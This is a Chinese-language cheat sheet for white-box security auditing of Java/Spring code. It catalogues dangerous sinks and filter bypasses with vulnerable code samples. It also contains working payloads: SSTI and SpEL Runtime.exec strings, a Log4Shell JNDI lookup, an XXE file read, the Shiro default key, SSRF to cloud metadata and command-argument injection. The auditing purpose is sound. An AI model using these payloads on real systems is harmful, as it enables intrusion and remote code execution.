# Java Sink 速查表（Spring/JavaEE 白盒审计）

## 何时开本表
- Java/Spring 项目白盒审计，按漏洞类快速枚举危险汇并回溯污点可达性。
- 已确认污点源（Controller 入参/Header/上传名），要定位 sink 与绕过点。
- 评估黑名单/全局过滤器是否真拦得住——下表"常见绕过"列就是答案。

## 污点源

| 来源 | 典型形态 | 备注 |
|---|---|---|
| Spring MVC 绑定 | `@RequestParam` `@PathVariable` `@ModelAttribute` `@RequestBody` | POJO 嵌套字段自动绑定常被漏审 |
| Servlet 原生 | `request.getParameter()` `getHeader()` `getCookies()` `getQueryString()` `getPathInfo()` | Header/Cookie 常进日志、跳转、内网请求 |
| JSON body | `@RequestBody Map`、`JSON.parseObject(body)`、Jackson `readTree()` | 整包转 String 再拼接是高危形态 |
| WebSocket/STOMP | `@MessageMapping` `@OnMessage`、`TextMessage.getPayload()` | WS 握手常绕过 MVC 拦截器，权限单独看 |
| 文件上传 | `MultipartFile.getOriginalFilename()` | 文件名浏览器全控，含 `../`、分号截断 |

## 危险汇（按漏洞类）

### SQL 注入

| 函数/API | 危险条件 | 常见绕过 |
|---|---|---|
| `Statement.execute/executeQuery/executeUpdate(拼接串)` | 任意拼接进 SQL 文本 | `--`、`/*!50000union*/`、大小写混淆 |
| MyBatis `${}`（含 `<foreach>` 拼表名/排序） | ORDER BY / LIKE / IN / 表名 / 列名处 | 无引号上下文不需逃逸，直接嵌语法 |
| Hibernate `createQuery()` / `createNativeQuery()` | HQL/SQL 拼接 | HQL 函数二次注入转 native |
| `JdbcTemplate.query(String.format(sql))`、MyBatis-Plus `.last()` | format 拼接 / `.last("limit "+n)` | 分页排序高频点 |

```xml
<!-- mapper.xml：ORDER BY 用不了 #{}，开发被迫 ${}，最高频注入位 -->
SELECT * FROM user ORDER BY ${orderBy} ${orderDir}
```

审计要点：
- 全局搜 mapper XML 的 `${`（排除 `#{}`），再看是否排序/动态表名/IN——这三处 `#{}` 不可用，必被写成 `${}`。
- 关键字黑名单拦不住：`${}` 点可走 `CASE WHEN`/时间盲注/报错注入，全程不含 select/union 等被拦词。

### SpEL / OGNL 注入

| 函数/API | 危险条件 | 常见绕过 |
|---|---|---|
| `SpelExpressionParser.parseExpression(污点)` + `getValue()` | 表达式串可控 | `T(java.lang.Runtime)` 反射执行 |
| `StandardEvaluationContext` | 未换 `SimpleEvaluationContext` | Simple 版才禁类型引用与构造器 |
| Struts2 `ValueStack.findValue(污点)` | OGNL 求值入口 | `%{...}` `${...}` 二次求值 |

```java
Expression e = new SpelExpressionParser().parseExpression(body.get("expr"));
return e.getValue(new StandardEvaluationContext(), Object.class); // RCE
```

审计要点：
- 全局搜 `parseExpression(`，确认入参是否含请求可控片段——哪怕是常量前缀+变量拼接。
- 杀伤力由 Context 决定：`StandardEvaluationContext` 可 `T()` 反射；换 Simple 只是去掉类型引用，属性访问仍在。

### 反序列化

| 函数/API | 危险条件 | 常见绕过 |
|---|---|---|
| `ObjectInputStream.readObject()` | 输入来自请求体/Cookie/Redis/MQ | gadget 取决于 classpath（CommonsCollections 等） |
| Fastjson `JSON.parseObject()` / `parse()` | autoType 开或版本 ≤1.2.47 | `@type` 指 JNDI gadget（JdbcRowSetImpl） |
| Jackson `enableDefaultTyping()` / `activateDefaultTyping()` / `@JsonTypeInfo(Id.CLASS)` | 多态反序列化入口 | 白名单子类含 gadget 即可利用 |
| Shiro rememberMe Cookie | AES key 硬编码/默认 `kPH+bIxk5D2deZiIxcaaaA==` | 拿 key 即可伪造 → 反序列化/内存马 |

```java
rm.setCipherKey(Base64.decode("kPH+bIxk5D2deZiIxcaaaA==")); // 默认 key 写死
// rememberMe Cookie → AES-CBC 解密 → ObjectInputStream.readObject()
```

审计要点：
- 搜 `readObject(`，看上游是 `getCookie()/getInputStream()` 还是固定数据；Shiro 重点查 `setCipherKey` 硬编码或配置可读。
- Fastjson 查两处：pom 版本（≤1.2.47 无需开 autoType）与 `ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`。

### SSRF

| 函数/API | 危险条件 | 常见绕过 |
|---|---|---|
| `new URL(污点).openConnection()` | host 可控且未校验 | 302 跳内网（默认跟随重定向） |
| Apache `HttpClient.execute()` | 未禁重定向且无 host 白名单 | DNS rebinding、泛解析域 |
| `RestTemplate.getForObject/exchange/execute` | URL 拼接请求参数 | redirect 链、部分实现吃 `file://` |
| `HttpURLConnection.setInstanceFollowRedirects(true)` | 跨 host 跳转继续请求 | 白名单只校验首跳即被绕过 |

```java
HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
c.setInstanceFollowRedirects(true); // 302 可跳 169.254.169.254
return new String(c.getInputStream().readAllBytes()); // 响应原样回显
```

审计要点：
- 白名单只校验首次 host 拦不住重定向链：必须 `setInstanceFollowRedirects(false)` 或每跳校验。
- URL 解析差异多：`http://evil@internal` userinfo、`\` 与 `/`、十进制 IP；`InetAddress` 解析后比对网段才算数。

### 路径穿越 / 任意文件

| 函数/API | 危险条件 | 常见绕过 |
|---|---|---|
| `new File(base, name)` / `Paths.get(base, name)` | name 含 `..` 未归一化 | 先 URL 解码再拼、绝对路径覆盖 base |
| `getCanonicalPath().startsWith(base)` | 少写路径分隔符 | `startsWith("/var/www")` 被 `/var/www-evil` 命中 |
| Zip slip：`Paths.get(dest, zipEntry.getName())` | entry 名未校验 | `../../` 写出解压目录落地 webshell |
| `Content-Disposition: filename=` 回显上传名 | 未编码，CRLF 头注入 | 下载/预览接口高发：参数常是完整相对路径而非 id |

```java
while ((e = zis.getNextEntry()) != null)
    Files.copy(zis, Paths.get(destDir, e.getName())); // entry 名可控 → zip slip
```

审计要点：
- 唯一可靠判断是 `getCanonicalPath()` 归一化后 `startsWith(base + File.separator)`；手工 replace `..` 可被编码/嵌套绕过。

### XXE

| 函数/API | 危险条件 | 常见绕过 |
|---|---|---|
| `DocumentBuilderFactory` / `SAXParserFactory` | 未设 disallow-doctype-decl | 参数实体外带 `%;p;`（无回显也能读） |
| `XMLInputFactory.newFactory()`（StAX） | 未设 `SUPPORT_DTD=false` | Billion laughs DoS |
| dom4j `SAXReader` / jdom `SAXBuilder` / XStream `fromXML()` | 默认解析外部实体 | XXE 读文件/打 SSRF；老版 XStream 配合代理链 |

```java
DocumentBuilderFactory f = DocumentBuilderFactory.newInstance(); // 缺 disallow 特性即 XXE
Document d = f.newDocumentBuilder().parse(request.getInputStream()); // <!ENTITY xxe SYSTEM "file:///etc/passwd">
```

审计要点：
- 反向搜最省力：先找 `parse(`/`fromXML(` 调用点，再回看 factory 特性——99% 业务代码没设 disallow-doctype-decl。
- 有回显直接 SYSTEM file 读本地文件；无回显走参数实体外带。

### SSTI

| 引擎 | sink | 危险条件 | 常见绕过 |
|---|---|---|---|
| Freemarker | `new Template(n,new StringReader(tpl),cfg)` / `cfg.getTemplate(可控名)` | 模板串/名可控 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Velocity | `Velocity.evaluate(ctx,writer,"tag",污点)` | 模板串可控 | `#set` 反射 Runtime |
| Thymeleaf | `return "user/" + 污点`（视图名拼接） | 无 redirect:/forward: 前缀 | `::__${T(java.lang.Runtime)...}__::.x`（fragment 表达式） |

```java
@GetMapping("/page") public String page(@RequestParam String lang) { return "user/" + lang; }
// payload: lang=::__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

审计要点：
- Thymeleaf 特征 = 返回 String 拼请求参数；`__${}__` 预处理先于表达式求值，SpEL 拦截器不一定覆盖。
- Freemarker 看 `Configuration` 是否设 `setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER)`，默认可 `?new` 实例化。

### 命令执行

| 函数/API | 危险条件 | 常见绕过 |
|---|---|---|
| `Runtime.getRuntime().exec(String)` | 整串含污点 | 按空格分词，`\|`/`&&` 不生效但参数注入仍在 |
| `new ProcessBuilder(cmd).start()` | 参数含污点 | ffmpeg/zip/exiftool 类工具的 `-` 参数注入 |
| `ScriptEngine.eval()` | Nashorn/Groovy 脚本串可控 | `getEngineByName("nashorn")` 直接 eval |

```java
Runtime.getRuntime().exec(new String[]{"ping","-c","1",request.getParameter("ip")});
// ip="8.8.8.8 -o /tmp/pwn" —— 无 shell 但工具参数被塞
```

审计要点：
- exec 单参版用 StringTokenizer 分词，管道不生效≠安全：目标工具的输出路径/格式/回调参数仍可注入。
- 搜 `exec(`、`ProcessBuilder`、`ScriptEngine` 三件套可覆盖九成 Java 命令执行面。

### 权限注解缺失 / 越权

| 形态 | 危险条件 | 常见绕过 |
|---|---|---|
| 方法无 `@PreAuthorize`/`@PostAuthorize` | 仅靠 URL pattern 鉴权，或缺 `@EnableGlobalMethodSecurity(prePostEnabled=true)` 致注解失效 | 换 HTTP 方法/大小写/尾斜杠绕 matcher |
| `@PreAuthorize("isAuthenticated()")` | 只认证不鉴权，id 从参数取 | 换 id 打对象级（水平越权） |
| `permitAll()` 列表过宽 | 含 `/**` 或运维接口 | 直接访问 /api/admin/* |

```java
@GetMapping("/api/order/detail")
@PreAuthorize("isAuthenticated()") // 只认证，归属未校验 → 水平越权；admin 接口忘注解 → 垂直越权
public Order detail(@RequestParam Long id) { return orderService.findById(id); }
```

审计要点：
- 对比法最有效：同 Controller 内兄弟接口注解不一致；或 SecurityConfig matcher 与实际路由对不齐（`/api/user/**` vs `/api/user/**/`）。
- 本质是对象 id 来源：id 来自 `@RequestParam` 就可换，来自 `SecurityContextHolder.getContext().getAuthentication()` 才可信。

### JWT 弱校验

| 形态 | 危险条件 | 常见绕过 |
|---|---|---|
| 硬编码密钥 | `setSigningKey("固定串")` 或弱口令 | 源码/前端泄露即伪造身份；jwt-tool 离线爆破 |
| 算法未锁定 | parser 不校验 header.alg，自研校验无 alg 白名单 | HS256↔RS256 混淆（公钥当 HMAC 密钥）、alg=none 去签名段 |
| 信任 claims | role/userId 只读 token 不回查库 | 改 role 提权 |

```java
Claims c = Jwts.parser().setSigningKey(publicKeyBytes) // 公钥当 HMAC secret → 可自签
    .parseClaimsJws(token).getBody();
String role = c.get("role", String.class); // 鉴权只信 payload，不回查库
```

审计要点：
- jjwt 查三处：`setSigningKey` 入参来源（字面量=硬编码）、关键声明是否 `requireIssuer/claim` 锁定、鉴权决策是否只信 payload。
- 自研 Base64 解开自比对的实现，必查 alg 白名单缺失。

## 该栈特有

| 面 | 查找特征 | 危害 |
|---|---|---|
| Spring Boot Actuator | `management.endpoints.web.exposure.include: *`；`/actuator/env` `/actuator/heapdump` `/actuator/jolokia` | env 泄配置密码；heapdump 提取 DB/JWT 密钥；jolokia MBean exec RCE |
| Tomcat AJP（Ghostcat） | server.xml `<Connector protocol="AJP/1.3" port="8009">` 且无 secretRequired | 伪造 `javax.servlet.include.request_uri` 读 WEB-INF 任意文件 |
| Log4Shell | log4j-core <2.17.1 且用户输入进 `logger.info()` | `${jndi:ldap://x}` 消息查找替换加载远程类 |
| GraphQL | `GraphQL.execute()` 无 depth limit、introspection 未关 | 嵌套查询 DoS；introspection 摸全 schema 打越权 |

## 历史 CVE 模式

| CVE | 根因一句话 | 审计查找特征 |
|---|---|---|
| CVE-2021-44228 (Log4Shell) | log4j2 消息查找支持 JNDI，日志内容可控即 RCE | pom log4j-core<2.17 + 任意 `logger.xx(请求值)` |
| CVE-2016-4437 (Shiro 1.2.4) | rememberMe AES 密钥用硬编码默认值 | 出现 `kPH+bIxk5D2deZiIxcaaaA==` 或 `setCipherKey` 字面量 |
| CVE-2022-22965 (Spring4Shell) | JDK9+ 数据绑定可写 `class.module.classLoader` | Controller POJO 绑定非基础对象 + WAR 部署于 Tomcat |
| CVE-2020-1938 (Ghostcat) | AJP 连接器默认暴露且信任 include 属性 | `protocol="AJP/1.3"` 且 8009 端口可达 |
| CVE-2017-18349 (Fastjson<1.2.28) | autoType 未默认关死，`@type` 触发 gadget | pom fastjson 版本 + `parseObject(污点)` 调用面 |

## 自动化辅助

1. CodeQL `UnsafeDeserialization` / semgrep `java-unsafe-deserialization`：`request.getParameter/body` → `readObject()`/`parseObject()` 全链路，人工复核框架内部封装点。
2. semgrep 扫 MyBatis XML：匹配 `select/insert/update/delete` 标签内 `${...}`（排除 `#{}`），导出 mapper 文件+行号，回溯 Java 侧参数来源。
3. CodeQL `Ssrf`（RequestForgery）：RemoteFlowSource → `URL/openConnection/HttpClient/RestTemplate`，标注 `setInstanceFollowRedirects(true)` 路径为重定向可绕。
4. semgrep 正则型硬编码密钥：`setSigningKey("...")`、`setCipherKey(Base64.decode("..."))`、yml 的 `secret|password|key` 字面量，命中后人工判可利用性。
